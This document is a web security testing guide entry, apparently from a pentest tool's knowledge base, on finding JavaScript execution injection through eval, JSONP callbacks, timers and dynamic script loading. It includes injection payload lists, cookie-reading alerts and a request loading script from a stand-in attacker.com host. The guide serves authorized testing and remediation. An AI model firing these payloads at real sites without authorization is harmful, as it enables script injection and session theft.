---
id: WSTG-CLNT-02
title: Testing for JavaScript Execution
category: Client-Side
severity_range: Medium-High
owasp_ref: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/02-Testing_for_JavaScript_Execution
---

# WSTG-CLNT-02: Testing for JavaScript Execution

## Summary

JavaScript execution vulnerabilities occur when user-controllable data reaches JavaScript execution sinks such as `eval()`, `setTimeout()`, `setInterval()`, `Function()`, or script element creation without proper sanitization. Unlike DOM XSS which focuses on HTML context injection, this test specifically targets JavaScript code execution contexts where attacker input is interpreted as JavaScript code, potentially allowing arbitrary script execution, session hijacking, and data theft.

## Test Objectives

- Identify JavaScript execution sinks in application code
- Determine if user-controllable data reaches execution sinks
- Test injection of JavaScript code through identified input vectors
- Assess the impact of successful JavaScript execution

## Prerequisites

- Target application uses client-side JavaScript
- Docker pentest container capturing traffic
- JavaScript source code accessible for analysis

## Test Steps

### Step 1: Identify JavaScript Execution Sinks

**CLI Actions:**
Use `curl` to fetch pages containing JavaScript:

```
GET /app/main HTTP/1.1
Host: target.com
```

Use `curl` to collect all JavaScript files loaded by the application. Search for dangerous execution sinks:

```javascript
eval()
setTimeout(string, ...)
setInterval(string, ...)
new Function(string)
execScript()          // IE-specific
setImmediate(string)
```

Also search for indirect execution patterns:
```javascript
document.write('<script>' + userInput + '</script>')
element.setAttribute('onclick', userInput)
element.setAttribute('onerror', userInput)
script.src = userInput
script.text = userInput
```

### Step 2: Trace Data Flow to Execution Sinks

**CLI Actions:**
Use `curl` to fetch and analyze JavaScript source code. Identify where user input enters the code:

```
GET /static/js/app.js HTTP/1.1
Host: target.com
```

Look for patterns where URL parameters, cookies, or API responses flow into eval-like functions:
```javascript
var config = eval('(' + urlParam + ')');
setTimeout('redirect("' + location.hash.slice(1) + '")', 1000);
new Function('return ' + jsonpResponse)();
```

### Step 3: Test eval-Based Injection

**CLI Actions:**
Use `curl` to inject JavaScript through parameters that reach `eval()`:

```
GET /page?config=alert('XSS') HTTP/1.1
Host: target.com
```

```
GET /page?callback=alert('XSS')// HTTP/1.1
Host: target.com
```

Use `curl --data-urlencode` to encode payloads for URL parameters:
- `alert('XSS')` -> `alert%28%27XSS%27%29`

Test breaking out of string contexts within eval:
```
GET /page?data=');alert('XSS');// HTTP/1.1
Host: target.com
```

```
GET /page?data="+alert('XSS')+" HTTP/1.1
Host: target.com
```

### Step 4: Test JSONP Callback Injection

**CLI Actions:**
Use `curl` to test JSONP endpoints for callback parameter injection:

```
GET /api/data?callback=alert HTTP/1.1
Host: target.com
```

```
GET /api/data?callback=eval(name)// HTTP/1.1
Host: target.com
```

```
GET /api/data?jsonp=alert('XSS')// HTTP/1.1
Host: target.com
```

Check if the response wraps data in the attacker-supplied callback function name without validation.

### Step 5: Test setTimeout/setInterval String Injection

**CLI Actions:**
Use `curl` to inject into timer functions:

```
GET /page?action=alert('XSS') HTTP/1.1
Host: target.com
```

```
GET /page?redirect=javascript:alert('XSS') HTTP/1.1
Host: target.com
```

If the application constructs timer strings from user input:
```javascript
setTimeout('doAction("' + userInput + '")', 1000);
```

Test with:
```
GET /page?action=");alert('XSS');// HTTP/1.1
Host: target.com
```

### Step 6: Test Dynamic Script Loading

**CLI Actions:**
Use `curl` to check if user input controls script source URLs:

```
GET /page?widget=//attacker.com/evil.js HTTP/1.1
Host: target.com
```

```
GET /page?plugin=data:text/javascript,alert('XSS') HTTP/1.1
Host: target.com
```

Use `curl` to search for patterns where script elements are dynamically created.

Use `rynix_plugin_run('template-scan')` to check for JavaScript execution and XSS findings.

## Payloads

### eval() Injection Payloads
```
alert('XSS')
alert(document.cookie)
');alert('XSS');//
"+alert('XSS')+"
1;alert('XSS')
[].constructor.constructor('alert(1)')()
```

### setTimeout/setInterval Payloads
```
alert('XSS')
');alert('XSS');//
\');alert(\'XSS\');//
"+alert("XSS")+"
```

### JSONP Callback Payloads
```
alert
eval
Function
alert('XSS')//
eval(name)//
```

### Function Constructor Payloads
```
alert('XSS')
return alert('XSS')
});alert('XSS');//
```

### Script Source Injection
```
//attacker.com/evil.js
data:text/javascript,alert('XSS')
data:,alert('XSS')
javascript:alert('XSS')
```

### Context-Breaking Payloads
```
'-alert('XSS')-'
\'-alert(\'XSS\')//
";alert('XSS');//
`-alert('XSS')-`
${alert('XSS')}
```

## Detection Criteria

A finding should be logged when:
- User-controllable data reaches `eval()`, `Function()`, `setTimeout(string)`, or `setInterval(string)`
- JSONP callbacks allow arbitrary function names without allowlisting
- Dynamic script elements load attacker-controlled URLs
- JavaScript template literals process unsanitized user input
- Event handler attributes are set from user-controlled data
- Injected JavaScript code executes in the browser context

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| Direct JavaScript execution via eval/Function with user input | High |
| JSONP callback injection allowing arbitrary JS execution | High |
| Script source URL controllable by attacker | High |
| JavaScript execution in authenticated context with session access | High |
| eval-based injection blocked by CSP | Medium |
| setTimeout/setInterval injection with limited input length | Medium |
| Execution sink reachable but input heavily filtered | Low |
| eval used with server-controlled data only (no user input path) | Informational |
| No user-controllable data reaches execution sinks | Not a finding |

## Remediation

- Eliminate use of `eval()`, `new Function()`, and string-based `setTimeout`/`setInterval`
- Use `JSON.parse()` instead of `eval()` for JSON parsing
- Use function references instead of strings for timers: `setTimeout(myFunction, 1000)`
- Allowlist JSONP callback function names (alphanumeric only, maximum length)
- Implement Content-Security-Policy with `script-src` to restrict script execution
- Use `'strict-dynamic'` CSP to prevent unauthorized script loading
- Validate and sanitize all user input before any JavaScript processing
- Use trusted types API to prevent string-to-code conversion
- Avoid constructing JavaScript code from user input under any circumstances

## References

- [OWASP Testing Guide - JavaScript Execution](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/02-Testing_for_JavaScript_Execution)
- [CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code](https://cwe.mitre.org/data/definitions/95.html)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)

## Rynix workflow

1. `scope_check` and `register_scope` for the target host.
2. `get_wstg_test` for this test ID — read objectives.
3. Execute probes via `http_probe` / `compare_role_response` / `run_idor_matrix`.
4. `track_wstg_test` with status and evidence path.
5. `record_finding` only when verified with probe evidence.

## Evidence requirements

- Request/response snippet or `compare_role_response` diff.
- Session ID on all tool calls.
- No unverified claims in `export_report`.
## ASVS mapping

- V3 Session Management — client-side token storage.
- V5 Validation — DOM sinks and postMessage origins.

## CWE references

- CWE-79: XSS
- CWE-1021: Improper Restriction of Rendered UI Layers

## Rynix tooling

- Primary tools: ``list_frontend_routes``, ``http_probe``, ``rynix_plugin_run` (browser-debug)`

## Test focus

- Map client routes; verify server enforces auth regardless of UI guards.

## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

